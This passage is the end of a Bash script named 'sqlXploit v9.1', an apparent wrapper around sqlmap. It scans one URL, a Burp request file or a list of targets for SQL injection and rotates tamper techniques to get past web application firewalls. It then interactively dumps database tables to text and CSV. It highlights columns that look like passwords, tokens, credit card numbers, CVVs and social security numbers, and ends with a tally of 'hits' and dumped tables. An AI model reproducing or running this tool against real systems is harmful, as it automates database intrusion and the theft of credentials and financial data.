  while IFS= read -r line; do
    echo "$line" | grep -qP '^\|\s+\w+\s+\|' || continue
    local cn; cn=$(echo "$line" | awk -F'|' '{gsub(/[[:space:]]/,"",$2); print $2}')
    [[ -n "$cn" && "$cn" != "Column" && "$cn" != "-" ]] && col_names+=("$cn")
  done <<< "$cout"

  if (( ${#col_names[@]} > 0 )); then
    local ci=1
    for cn in "${col_names[@]}"; do
      local cf=""
      echo "$cn" | grep -qiE "pass|secret|token|key|hash|credit|card|cvv|ssn|salary|balance" \
        && cf=" ${R}★${NC}"
      log "  ${G}${ci}${NC}) ${cn}${cf}"
      ((ci++)) || true
    done
  fi

  local col_flag=""
  if (( ${#col_names[@]} > 0 )) && iask_yn "  Specific columns only?"; then
    local cc; cc=$(iask "  Col numbers/names: " "")
    if [[ -n "$cc" ]]; then
      local chosen_c=()
      if echo "$cc" | grep -qP '^\d+(,\d+)*$'; then
        IFS=',' read -ra ns <<< "$cc"
        for n in "${ns[@]}"; do
          n=$(echo "$n" | tr -d ' ')
          (( n >= 1 && n <= ${#col_names[@]} )) && chosen_c+=( "${col_names[$((n-1))]}" )
        done
      else
        IFS=',' read -ra nms <<< "$cc"
        for nm in "${nms[@]}"; do
          nm=$(echo "$nm" | tr -d ' '); [[ -n "$nm" ]] && chosen_c+=("$nm")
        done
      fi
      (( ${#chosen_c[@]} > 0 )) && col_flag="-C $(IFS=','; echo "${chosen_c[*]}")"
    fi
  fi

  local start_flag="" stop_flag=""
  local cnt_out cnt_val
  cnt_out=$( "${base_arr[@]}" -D "$db" -T "$tb" --count </dev/null 2>&1 | sanitize_output ) || true
  cnt_val=$(echo "$cnt_out" | grep -oP '\|\s*\K\d+(?=\s*\|)' | grep -v '^0$' | head -1 || echo "?")
  log "  ${Y}Row count: ${cnt_val}${NC}"

  if [[ "$cnt_val" =~ ^[0-9]+$ ]] && (( cnt_val > 500 )); then
    warn "  Large table: ${cnt_val} rows"
    log "  ${G}1${NC}) First 500  ${G}2${NC}) First 1000  ${G}3${NC}) Custom  ${G}4${NC}) ALL"
    local lc; lc=$(iask "  Limit [1]: " "1")
    case "$lc" in
      1) start_flag="--start=0"; stop_flag="--stop=500"   ;;
      2) start_flag="--start=0"; stop_flag="--stop=1000"  ;;
      3) local rs re
         rs=$(iask "  Start row: " "0"); re=$(iask "  Stop row: " "100")
         start_flag="--start=${rs}"; stop_flag="--stop=${re}" ;;
    esac
  fi

  iask_yn "  Dump ${db}.${tb}?" "y" || { info "Skipping"; return; }

  local dcmd=( "${base_arr[@]}" -D "$db" -T "$tb" --dump )
  [[ -n "$col_flag"   ]] && dcmd+=( $col_flag )
  [[ -n "$start_flag" ]] && dcmd+=( "$start_flag" )
  [[ -n "$stop_flag"  ]] && dcmd+=( "$stop_flag" )

  step "Dumping ${db}.${tb}..."
  local dout
  dout=$( "${dcmd[@]}" </dev/null 2>&1 | sanitize_output ) || true
  echo "$dout" | tee -a "$LOG_FILE"

  local sf; sf=$(echo "${tb}" | tr '/' '_')
  echo "$dout" > "${DUMP_DIR}/${db}_${sf}.txt"
  ok "Saved → ${DUMP_DIR}/${db}_${sf}.txt"
  echo "[DUMPED] ${label} → ${db}.${tb}" >> "$HITS_FILE"

  iask_yn "  Export as CSV?" && {
    local cdout
    cdout=$( "${dcmd[@]}" --dump-format=CSV </dev/null 2>&1 | sanitize_output ) || true
    echo "$cdout" > "${DUMP_DIR}/${db}_${sf}.csv"
    ok "CSV → ${DUMP_DIR}/${db}_${sf}.csv"
  }
  sleep "${CURRENT_DELAY:-0}"
}

# ═══════════════════════════════════════════════════════════════
#  PROCESS TARGET
# ═══════════════════════════════════════════════════════════════
process_target() {
  local url_arg="$1" label="$2" probe_url="$3"

  BLOCK_COUNT=0
  CURRENT_THREADS=$SQLMAP_THREADS
  TAMPER_INDEX=0
  CURRENT_TAMPER=""
  CURRENT_DELAY=0
  WAF_NAME=""
  DETECTED_TECHNIQUE=""
  SQLI_FOUND=false

  sep
  log "${G}${BOLD}TARGET: ${label}${NC}"
  log "${DIM}  Mode: ${MODE_NAME} | $(date '+%H:%M:%S')${NC}"
  sep

  local T0; T0=$(date +%s)

  capture_baseline   "$probe_url"
  fingerprint_target "$probe_url"

  sep; info "${BOLD}▶ SQLi SCAN${NC}"
  adaptive_scan "$url_arg" "$probe_url"
  timer "Elapsed: $(( $(date +%s) - T0 ))s"

  $SQLI_FOUND && interactive_dump "$url_arg" "$label"

  local elapsed=$(( $(date +%s) - T0 ))
  sep
  ok "Done in ${elapsed}s ($(( elapsed / 60 ))m $(( elapsed % 60 ))s)"
  sep
  sleep "${CURRENT_DELAY:-0}"
}

# ═══════════════════════════════════════════════════════════════
#  DISPATCH
# ═══════════════════════════════════════════════════════════════
sep
log "\n${G}${BOLD}⚡ sqlXploit v9.1 — ${MODE_NAME} Mode${NC}"
log "   Output: ${Y}${LOG_DIR}/${NC}\n"
sep

if [[ -n "$burp_file" ]]; then
  probe_url=$(grep -m1 -oP 'https?://[^ \r\n]+' "$burp_file" 2>/dev/null || echo "")
  [[ -z "$probe_url" ]] && { err "Cannot extract URL from Burp file."; exit 1; }
  process_target "-r ${burp_file}" "BurpFile:${burp_file}" "$probe_url"
elif [[ -n "$targets_file" ]]; then
  total=$(wc -l < "$targets_file"); cur=0
  while IFS= read -r target; do
    [[ -z "$target" ]] && continue
    ((cur++)) || true
    sep; info "[${cur}/${total}] ${target}"
    process_target "$target" "$target" "$target"
  done < "$targets_file"
else
  process_target "$input_url" "$input_url" "$input_url"
fi

# ═══════════════════════════════════════════════════════════════
#  FINAL REPORT — all variables initialized, no arithmetic errors
# ═══════════════════════════════════════════════════════════════
banner; sep
log "${G}${BOLD}  SCAN COMPLETE${NC}"; sep

total_time=$(( $(date +%s) - SCAN_START ))

total_sqli=0
total_dumped=0
total_blks=0

if [[ -s "$HITS_FILE" ]]; then
  _tmp=$(grep -c "SQLI_CONFIRMED\|injectable\|Injectable" "$HITS_FILE" 2>/dev/null || true)
  total_sqli=$(( ${_tmp:-0} + 0 ))
  _tmp=$(grep -c "DUMPED" "$HITS_FILE" 2>/dev/null || true)
  total_dumped=$(( ${_tmp:-0} + 0 ))
fi

if [[ -s "$BLOCK_LOG" ]]; then
  _tmp=$(wc -l < "$BLOCK_LOG" 2>/dev/null || true)
  total_blks=$(( ${_tmp:-0} + 0 ))
fi

total_hits=$(( total_sqli + total_dumped ))

log "  ${C}Mode          :${NC} ${MODE_NAME}"
log "  ${C}Total time    :${NC} ${total_time}s ($(( total_time / 60 ))m $(( total_time % 60 ))s)"
log "  ${C}Output        :${NC} ${LOG_DIR}/"
log "  ${Y}Blocks hit    :${NC} ${total_blks}"
log "  ${R}SQLi findings :${NC} ${total_sqli}"
log "  ${R}Tables dumped :${NC} ${total_dumped}"
log "  ${R}TOTAL HITS    :${NC} ${total_hits}"
sep

if (( total_hits > 0 )); then
  log "${R}${BOLD}  ⚠  ${total_hits} finding(s) confirmed!${NC}"
  if [[ -s "$HITS_FILE" ]]; then
    grep -E "SQLI|DUMPED|INFO|injectable" "$HITS_FILE" 2>/dev/null | \
      while IFS= read -r l; do log "  ${R}→${NC} ${l}"; done
  fi
else
  log "${G}  ✓  No SQLi vulnerabilities confirmed${NC}"
fi
sep

log "\n${C}${BOLD}Output files:${NC}"
log "  ${G}Full log  :${NC} ${LOG_DIR}/full_log.txt"
log "  ${G}Confirmed :${NC} ${LOG_DIR}/confirmed.txt"
log "  ${G}Intel     :${NC} ${LOG_DIR}/intel.txt"
if [[ -d "$DUMP_DIR" ]] && ls "$DUMP_DIR" 2>/dev/null | grep -q '.'; then
  log "  ${G}Dumps     :${NC} ${DUMP_DIR}/"
fi
sep
